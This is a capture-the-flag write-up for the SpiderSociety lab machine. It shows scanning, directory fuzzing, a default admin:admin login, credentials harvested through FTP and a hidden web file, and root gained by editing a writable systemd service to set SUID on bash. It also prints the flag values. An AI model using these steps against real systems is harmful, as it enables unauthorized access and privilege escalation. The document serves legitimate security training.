---
layout: /src/layouts/MarkdownPostLayout_PG.astro
title: SpiderSociety Proving Grounds Write-Up
author: Adrian Reategui
description: "SpideSociety ProvingGrounds practice Write-Up"
image: 
  url: "/images/posts/spidersocietybg.webp"
  alt: "SpideSociety ProvingGrounds practice Write-Up"
pubDate: 2025-04-04
tags:
  [
    "bash","FTP","SUID"
  ]
languages: ["bash"]
---

## 📝 SUMMARY
On the SpiderSociety machine, we found a web service running on port 80. Using directory enumeration, we discovered a libspider directory containing an admin panel. We logged in with default credentials (admin:admin) and found FTP server credentials inside.

With those FTP credentials, we accessed the server and found a hidden directory containing plaintext database credentials. Checking user privileges, we saw we could run certain commands as any user. We also owned a service file with write permissions.

By editing the service, we added a command for root to run, making the bash shell SUID. After reloading the system configuration and running the service, we confirmed bash had SUID permissions, giving us root access.
## 📄 NMAP SCAN
- Nmap scan report
```bash
# Nmap 7.95 scan initiated Mon Jun  2 17:33:43 2025 as: /usr/lib/nmap/nmap --privileged -sCV -p22,80,2121 -oN targeted 192.168.107.214
Nmap scan report for 192.168.107.214
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Spider Society
2121/tcp open  ftp     vsftpd 3.0.5
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  2 17:34:02 2025 -- 1 IP address (1 host up) scanned in 19.40 seconds
```
## 🔍 ENUMERATION
- We found a web service running on port 80 which doesn’t contain anything interesting.
![alt](/images/posts/spidersociety4.webp)
- While enumerating directories with ffuf, we found the directory libspider.
```
> ffuf -c --fc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.107.214/FUZZ" -t 300

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.107.214/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

images                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 111ms]
                        [Status: 200, Size: 4317, Words: 1230, Lines: 106, Duration: 102ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 105ms]
libspider               [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 102ms]
:: Progress: [220546/220546] :: Job [1/1] :: 245 req/sec :: Duration: [0:03:06] :: Errors: 167 ::
```
- When accessing the directory, we found an administration panel.
![alt](/images/posts/spidersociety5.webp)
- We used default credentials and managed to access as administrators (admin:admin).
![alt](/images/posts/spidersociety6.webp)
- When clicking on communication, a window appears showing us credentials for accessing the FTP server.
![alt](/images/posts/spidersociety.webp)
- We successfully accessed the FTP server and, while enumerating inside the libspider folder, we found a hidden directory.
 ```bash
> ftp 192.168.107.214 -P 2121
Connected to 192.168.107.214.
220 (vsFTPd 3.0.5)
Name (192.168.107.214:adrianreatva): ss_ftpbckuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||43313|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            1391 Apr 14 17:53 404.html
-rw-------    1 1002     1002           22 Jun 02 07:44 cmd.php
drwxr-xr-x    2 0        0            4096 Apr 14 17:53 images
-rwxr-xr-x    1 0        0            4317 Apr 14 17:53 index.html
drwxr-xr-x    2 0        0            4096 Apr 14 17:53 libspider
-rwxr-xr-x    1 0        0            1345 Apr 14 17:53 simple.py
-rw-------    1 1002     1002            5 Jun 02 07:53 test.txt
226 Directory send OK.
ftp> cd libspider
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||49836|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Apr 14 17:53 .
drwxr-xr-x    4 1002     1002         4096 Jun 02 07:53 ..
-r--------    1 33       33            170 Apr 14 17:53 .fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv
-rwxr-xr-x    1 0        0            5436 Apr 14 17:53 control-panel.php
-rwxr-xr-x    1 0        0            1389 Apr 14 17:53 fetch-credentials.php
-rwxr-xr-x    1 0        0            3752 Apr 14 17:53 index.php
-rwxr-xr-x    1 0        0             713 Apr 14 17:53 login.php
-rwxr-xr-x    1 0        0              88 Apr 14 17:53 logout.php
-rwxr-xr-x    1 0        0              51 Apr 14 17:53 users.php
226 Directory send OK.
```
- By making a GET request with curl, we were able to read the content and found plaintext database credentials.
```bash
> curl -s -X GET "http://192.168.107.214/libspider/.fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv"
```
![alt](/images/posts/spidersociety8.webp)
- Con las credenciales obtenidas nos intentamos conectar por SSH y accedemos a la maquina vicitma exitosamente
![alt](/images/posts/spidersociety9.webp)
## USER FLAG
- We read the first flag
```bash
spidey@spidersociety:~$ whoami && ifconfig && cat /home/spidey/local.txt
spidey
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.107.214  netmask 255.255.255.0  broadcast 192.168.107.255
        ether 00:50:56:ab:37:99  txqueuelen 1000  (Ethernet)
        RX packets 640040  bytes 315640613 (315.6 MB)
        RX errors 0  dropped 1534  overruns 0  frame 0
        TX packets 449400  bytes 169859437 (169.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 3652  bytes 281573 (281.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3652  bytes 281573 (281.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

1c7eabccccda039ee3f886369a57300e
```
## 🚀 PRIVILEGE ESCALATION
- Listing sudoers privileges, we found that our user can execute the following commands as any user.
```bash
spidey@spidersociety:~$ sudo -l
Matching Defaults entries for spidey on spidersociety:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User spidey may run the following commands on spidersociety:
    (ALL) NOPASSWD: /bin/systemctl restart spiderbackup.service
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) !/bin/bash, !/bin/sh, !/bin/su, !/usr/bin/sudo
```
- We run find on the service and, by listing its permissions, we found that we are the owner and have write permissions on it
```bash
spidey@spidersociety:~$ find / -name spiderbackup.service 2>/dev/null
/etc/systemd/system/multi-user.target.wants/spiderbackup.service
/etc/systemd/system/spiderbackup.service

spidey@spidersociety:~$ ls -la /etc/systemd/system/spiderbackup.service
-rw-rw-r-- 1 spidey spidey 205 Jun  2 08:40 /etc/systemd/system/spiderbackup.service
```
- Since we have write permissions, we edit the service by adding the instruction we want root to execute—in this case, to convert the bash into SUID.
```bash
spidey@spidersociety:~$ cat /etc/systemd/system/spiderbackup.service
[Unit]
Description=Spider Society Backup Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/bash -c "chmod u+s /usr/bin/bash"
User=root
Group=root

[Install]
WantedBy=multi-user.target
```
- We reload the configuration with systemctl daemon-reload and then execute spiderbackup. When listing bash, we see that it is SUID!
```bash
spidey@spidersociety:~$ sudo -u root /bin/systemctl daemon-reload

spidey@spidersociety:~$ sudo -u root /bin/systemctl restart spiderbackup.service

spidey@spidersociety:~$ ls -l /usr/bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /usr/bin/bash
```
- We became root
```bash
spidey@spidersociety:~$ bash -p
bash-5.2# whoami
root
```
## ROOT FLAG
- We read root's flag
```bash
bash-5.2# whoami && ifconfig && cat /root/proof.txt
root
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.107.214  netmask 255.255.255.0  broadcast 192.168.107.255
        ether 00:50:56:ab:37:99  txqueuelen 1000  (Ethernet)
        RX packets 639356  bytes 315572321 (315.5 MB)
        RX errors 0  dropped 1531  overruns 0  frame 0
        TX packets 448838  bytes 169798493 (169.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 3652  bytes 281573 (281.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3652  bytes 281573 (281.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

36cd9dca36f6b1c895b0eed2882074ef
```


